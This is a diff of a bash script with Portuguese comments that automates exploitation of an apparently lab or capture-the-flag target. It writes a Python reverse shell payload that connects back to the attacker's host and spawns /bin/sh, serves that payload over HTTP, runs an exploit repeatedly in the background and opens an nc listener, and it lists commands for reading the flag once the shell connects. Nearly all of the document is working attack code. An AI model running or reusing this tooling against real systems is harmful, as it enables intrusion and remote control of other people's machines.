@@ -9,10 +9,11 @@
 #
 # O script faz tudo sozinho:
 #   1. Detecta o IP do Kali
-#   2. Gera payload de reverse shell com retry
+#   2. Gera payload de reverse shell
 #   3. Sobe HTTP server para servir o payload
-#   4. Roda o exploit em loop até ter sucesso (detecta via log do HTTP)
-#   5. Abre nc interativo — o shell aparece no terminal
+#   4. Abre nc listener (foreground) — aguarda a conexão
+#   5. Roda o exploit em loop em background até ter sucesso
+#   6. Quando o exploit acerta, o shell aparece no terminal
 
 set -u
 
@@ -67,17 +68,15 @@ cleanup() {
 trap cleanup EXIT
 
 # ─── Gera payload de reverse shell ───────────────────────────
-# O payload tenta conectar 10x com intervalo de 1s.
-# Assim o nc tem tempo de subir entre a detecção e a conexão.
 cat > "$TMP/r" << PAYLOAD
 python3 -c "
-import socket,subprocess,os,time
-for _ in range(10):
- try:
-  s=socket.socket();s.connect(('$LHOST',$LPORT))
-  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
-  subprocess.call(['/bin/sh','-i']);break
- except:time.sleep(1)
+import socket,subprocess,os
+s=socket.socket()
+s.connect(('$LHOST',$LPORT))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(['/bin/sh','-i'])
 "
 PAYLOAD
 
@@ -110,73 +109,35 @@ if [ "$RCE_LEN" -gt 48 ]; then
     exit 1
 fi
 
-# ─── Exploit loop com detecção automática ────────────────────
-echo -e "${YELLOW}[*]${NC} Rodando exploit (até $MAX_ATTEMPTS tentativas)..."
+# ─── Exploit loop em BACKGROUND ──────────────────────────────
+echo -e "${YELLOW}[*]${NC} Exploit rodando em background (até $MAX_ATTEMPTS tentativas)"
+echo -e "${YELLOW}[*]${NC} Aguardando reverse shell..."
 echo ""
-
-SUCCESS=0
-for i in $(seq 1 $MAX_ATTEMPTS); do
-    printf "  [%2d/%d] " "$i" "$MAX_ATTEMPTS"
-
-    python3 "$EXPLOIT" \
-        --host "$TARGET" --port "$TPORT" \
-        --rce "$RCE_CMD" \
-        &> "$TMP/exploit_$i.log"
-
-    # Verifica se o HTTP server recebeu GET /r (= target baixou o payload)
-    if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
-        echo -e "${GREEN}EXPLOIT DEU CERTO!${NC}"
-        SUCCESS=1
-        break
-    fi
-
-    # Feedback baseado na saída do exploit
-    LAST=$(tail -1 "$TMP/exploit_$i.log" 2>/dev/null)
-    if echo "$LAST" | grep -q "normal-size cookie"; then
-        echo -e "leak falhou ${YELLOW}(cookie normal)${NC}"
-    elif echo "$LAST" | grep -q "RuntimeError\|Traceback"; then
-        echo -e "${RED}erro (target se recuperando)${NC}"
-    elif echo "$LAST" | grep -q "response=0"; then
-        echo "RCE enviado, verificando..."
-        sleep 3
-        if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
-            echo -e "  ${GREEN}EXPLOIT DEU CERTO!${NC}"
-            SUCCESS=1
-            break
-        fi
-    elif echo "$LAST" | grep -q "candidates=0"; then
-        echo -e "leak falhou ${YELLOW}(sem candidates)${NC}"
-    else
-        # Mostra última linha real para debug
-        echo "sem sucesso: $(echo "$LAST" | head -c 60)"
-    fi
-
-    sleep 3
-done
-
-if [ $SUCCESS -eq 0 ]; then
-    echo ""
-    echo -e "${RED}[-] $MAX_ATTEMPTS tentativas esgotadas.${NC}"
-    echo "    Verifique: curl http://$TARGET:$TPORT/"
-    echo "    O target pode precisar de reinício."
-    exit 1
-fi
-
-# ─── Reverse shell conectando ────────────────────────────────
-echo ""
-echo -e "${GREEN}════════════════════════════════════════════════${NC}"
-echo -e "${GREEN}  REVERSE SHELL CONECTANDO...${NC}"
-echo -e "${GREEN}════════════════════════════════════════════════${NC}"
-echo ""
-echo -e "  Comandos úteis:"
+echo -e "  Comandos úteis quando o shell conectar:"
 echo -e "    ${BOLD}whoami${NC}                   → usuário no target"
 echo -e "    ${BOLD}id${NC}                       → uid/gid"
 echo -e "    ${BOLD}hostname${NC}                 → nome do servidor"
 echo -e "    ${BOLD}cat /var/www/proof.txt${NC}   → flag"
-echo -e "    ${BOLD}uname -a${NC}                 → kernel"
 echo ""
 
-# nc listener em foreground — interativo
+(
+    for i in $(seq 1 $MAX_ATTEMPTS); do
+        python3 "$EXPLOIT" \
+            --host "$TARGET" --port "$TPORT" \
+            --rce "$RCE_CMD" \
+            &> "$TMP/exploit_$i.log"
+
+        # Se o HTTP server recebeu GET /r, o exploit deu certo — para
+        if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
+            break
+        fi
+
+        sleep 3
+    done
+) &
+EXPLOIT_PID=$!
+
+# ─── nc listener em FOREGROUND — já escutando quando o exploit rodar ──
 nc -lvnp $LPORT
 
 echo ""
